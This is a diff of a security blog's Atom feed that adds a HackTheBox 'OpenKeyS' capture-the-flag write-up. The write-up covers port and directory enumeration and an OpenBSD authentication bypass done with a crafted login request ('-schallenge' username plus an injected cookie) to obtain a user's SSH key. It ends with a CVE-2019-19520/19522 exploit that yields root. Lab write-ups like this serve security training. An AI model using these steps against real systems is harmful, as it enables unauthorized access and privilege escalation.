@@ -1,4 +1,254 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-09T23:54:24+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">Blue Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/" rel="alternate" type="text/html" title="Blue Machine Writeup- HackTheBox" /><published>2020-12-09T16:00:00+05:30</published><updated>2020-12-09T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/09/HTB_Blue_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Blue/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-11T00:07:27+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">OpenKeyS Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/10/HTB_Openkeys_Writeup/" rel="alternate" type="text/html" title="OpenKeyS Machine Writeup- HackTheBox" /><published>2020-12-10T06:00:00+05:30</published><updated>2020-12-10T06:00:00+05:30</updated><id>http://localhost:4000/2020/12/10/HTB_Openkeys_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/10/HTB_Openkeys_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/OpenKeyS/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Open Port Enumeration&lt;/li&gt;
+  &lt;li&gt;Web Service Enumeration&lt;/li&gt;
+  &lt;li&gt;Authentication Vulnerability identified&lt;/li&gt;
+  &lt;li&gt;User SSH private key identified&lt;/li&gt;
+  &lt;li&gt;User shell gained&lt;/li&gt;
+  &lt;li&gt;Local Privilege Escalation Vulnerability identified&lt;/li&gt;
+  &lt;li&gt;Root shell gained&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;OpenBSD Authentication Bypass Vulnerability&lt;/li&gt;
+  &lt;li&gt;Local Privilege Escalation&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;open-ports-enumeration&quot;&gt;Open Ports Enumeration&lt;/h1&gt;
+&lt;p&gt;The open ports enumeration through targetRecon&lt;sup id=&quot;fnref:fn1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;, had identified two open ports namely, &lt;strong&gt;SSH&lt;/strong&gt; (22) and 
+&lt;strong&gt;HTTP&lt;/strong&gt; (80). The scan had not identified any known vulnerabilities on the target. The results of the scan are shown
+below.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌[b4bygroot☮arcolinux]-(~/HTB/OpenKeyS)
+└&amp;gt; targetRecon 10.10.10.199
+[+] Open Ports Scan
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+        22      ssh
+        80      http
+[+] Scripts Scan
+                 nmap -sV -A --script=default,vuln -p 22 10.10.10.199
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 00:30 IST
+Nmap scan report for 10.10.10.199 (10.10.10.199)
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
+|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.95 seconds
+
+                 nmap -sV -A --script=default,vuln -p 80 10.10.10.199
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 00:30 IST
+Nmap scan report for 10.10.10.199 (10.10.10.199)
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    OpenBSD httpd
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-title: Site doesn't have a title (text/html).
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 580.15 seconds
+
+[+] Summary 
+22      ssh     OpenSSH 8.1
+                No vuln found
+80      http    OpenBSD httpd N/A
+                No vuln found
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;web-service-enumeration&quot;&gt;Web Service Enumeration&lt;/h1&gt;
+&lt;p&gt;Browsing to &lt;a href=&quot;http://openkeys.htb&quot;&gt;http://openkeys.htb&lt;/a&gt; had revealed a login page that is supposed to retrieve &lt;strong&gt;SSH
+Private Key&lt;/strong&gt; for the authenticated user. Following this, a &lt;strong&gt;gobuster&lt;/strong&gt; scan was carried out, that had identified an
+interesting directory named &lt;strong&gt;includes&lt;/strong&gt;. The partial results of the scan are given below.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;λ arcolinux OpenKeyS → gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.199
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://10.10.10.199
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:         GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2020/12/10 01:31:25 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/images &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        
+/css &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            
+/includes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;       
+/js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             
+/vendor &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          
+/fonts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    
+&lt;span class=&quot;nt&quot;&gt;---SNIP---&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Browsing to &lt;a href=&quot;http://openkeys.htb/includes&quot;&gt;http://openkeys.htb/includes&lt;/a&gt; had revealed two files listed on the directory,
+named &lt;strong&gt;auth.php&lt;/strong&gt; and &lt;strong&gt;auth.php.swp&lt;/strong&gt;. Both the files were downloaded onto the attacking host for further analysis. 
+Although the extension from &lt;em&gt;auth.php.swp&lt;/em&gt; indicates that this is a &lt;em&gt;swap&lt;/em&gt; file, the &lt;strong&gt;file&lt;/strong&gt; command had identified few 
+key information about the file such as username and host. The same is given on the section below.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ξ HTB/OpenKeyS → file auth.php.swp 
+auth.php.swp: Vim swap file, version 8.1, pid 49850, user jennifer, host openkeys.htb, file /var/www/htdocs/includes/auth.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Examining the contents of the &lt;em&gt;swap&lt;/em&gt; file using &lt;strong&gt;vim&lt;/strong&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim -r auth.php.swp&lt;/code&gt; had revealed that the &lt;em&gt;authenticate&lt;/em&gt; 
+function executes a binary, &lt;strong&gt;check_auth&lt;/strong&gt; present on &lt;em&gt;auth_helpers/check_auth&lt;/em&gt;. The partial contents of the swap 
+file is given below.&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellcmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;../auth_helpers/check_auth &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$retcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$retcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SNIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The binary &lt;em&gt;check_auth&lt;/em&gt; was downloaded by browsing to 
+&lt;a href=&quot;http://openkeys.htb/auth_helpers/check_auth&quot;&gt;http://openkeys.htb/auth_helpers/check_auth&lt;/a&gt;, and analyzed for an attack
+vector.&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h1&gt;
+&lt;p&gt;Analyzing the file &lt;em&gt;check_auth&lt;/em&gt; with &lt;strong&gt;strings&lt;/strong&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings check_auth&lt;/code&gt; had revealed few key information, about the
+target including &lt;strong&gt;OpenBSD&lt;/strong&gt; and &lt;strong&gt;auth_userkey&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;λ arcolinux OpenKeyS → strings check_auth 
+/usr/libexec/ld.so
+OpenBSD
+libc.so.95.1
+_csu_finish
+&lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;_Jv_RegisterClasses
+atexit
+auth_userokay
+&lt;span class=&quot;nt&quot;&gt;---SNIP---&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Searching for the combination- &lt;em&gt;OpenBSD&lt;/em&gt; and &lt;em&gt;check_auth&lt;/em&gt; had revealed an &lt;strong&gt;authentication bypass vulnerability in 
+OpenBSD&lt;/strong&gt; &lt;sup id=&quot;fnref:fn2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; &lt;sup id=&quot;fnref:fn3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn3&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;. The vulnerability states that authentication on OpenBSD can be bypassed by using &lt;strong&gt;-schallenge&lt;/strong&gt;
+as the username with any password. Attempting the same on the login from &lt;a href=&quot;http://openkeys.htb&quot;&gt;http://openkeys.htb&lt;/a&gt;
+had managed to bypass authentication, but had ultimately failed in retrieving SSH keys as the target has no user
+&lt;em&gt;-schallenge&lt;/em&gt;. Having found a valid username &lt;strong&gt;jennifer&lt;/strong&gt; from the swap file, &lt;em&gt;auth.php.swp&lt;/em&gt;, a viable method would be to
+try and retrieve the SSH key for &lt;em&gt;jennifer&lt;/em&gt;. To that effect, the login request was intercepted with &lt;em&gt;BurpSuite&lt;/em&gt; and
+a new cookie field, &lt;em&gt;username&lt;/em&gt; was added to the request as 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie: PHPSESSID=9h0gbbeul2m6v82drk6eqe3ukb;username=jennifer&lt;/code&gt;. The modified request is given below.&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/index.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;openkeys.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;38&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://openkeys.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://openkeys.htb/index.php&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHPSESSID=9h0gbbeul2m6v82drk6eqe3ukb;username=jennifer&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+
+username=-schallenge&amp;amp;password=password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Forwarding the modified request had presented the &lt;em&gt;SSH Private Key&lt;/em&gt; of the user &lt;em&gt;jennifer&lt;/em&gt; and the same is shown on the
+screenshot given below.
+&lt;img src=&quot;/assets/images/OpenKeyS/jennifer_key.png&quot; alt=&quot;SSH Key&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The received key was copied onto a file, named &lt;strong&gt;jennifer.key&lt;/strong&gt;, and given appropriate key permissions. An attempt to 
+access the target via., &lt;strong&gt;SSH&lt;/strong&gt; as the user &lt;em&gt;jennifer&lt;/em&gt; was carried out as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -i jennifer.key jennifer@openkeys.htb&lt;/code&gt;. 
+This gave complete access to the target as the user &lt;em&gt;jennifer&lt;/em&gt; and the user flag was read. The same is shown below.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ξ HTB/OpenKeyS → ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; jennifer.key jennifer@openkeys.htb 
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'openkeys.htb (10.10.10.199)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '&lt;/span&gt;openkeys.htb,10.10.10.199&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
+Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2
+OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+openkeys$ id
+uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
+openkeys$ pwd
+/home/jennifer
+openkeys$ cat user.txt                                                                                                                                                                                       
+36ab2---REDACTED---d2b10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/OpenKeyS/usershell.png&quot; alt=&quot;User Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;With user access to the target established, enumeration further for privilege escalation was carried out. 
+The &lt;strong&gt;uname -a&lt;/strong&gt; command had identified the installed OS and version as &lt;strong&gt;OpenBSD 6.6&lt;/strong&gt;, shown below.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openkeys&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Google-Fu&lt;/em&gt; had listed a privilege escalation vector, &lt;strong&gt;CVE-2019-19520&lt;/strong&gt; &lt;sup id=&quot;fnref:fn4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn4&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; and a working exploit &lt;sup id=&quot;fnref:fn5&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn5&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; had been 
+identified. The exploit script was copied onto a file, &lt;strong&gt;privEsc.sh&lt;/strong&gt;, on the target, given executable permissions and 
+executed. This gave complete &lt;em&gt;root&lt;/em&gt; access to the target and the root flag was read. The same is shown below.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openkeys&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vi privEsc.sh
+openkeys&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x privEsc.sh                                                                                                                                                                                
+openkeys&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./privEsc.sh                                                                                                                                                                                       
+openbsd-authroot &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CVE-2019-19520 / CVE-2019-19522&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; checking system ...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; system supports S/Key authentication
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jennifer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jennifer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jennifer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; compiling ...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; running Xvfb ...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; testing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;CVE-2019-19520 ...
+_XSERVTransmkdir: ERROR: euid &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; 0,directory /tmp/.X11-unix will not be created.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] success! we have auth group permissions
+
+WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CTRL+C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; trying CVE-2019-19522 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S/Key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+Your password is: EGG LARD GROW HOG DRAG LAIN
+otp-md5 99 obsd91335
+S/Key Password:
+openkeys# &lt;span class=&quot;nb&quot;&gt;id                                                                                                                                                                                            
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;operator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 20&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 31&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;guest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
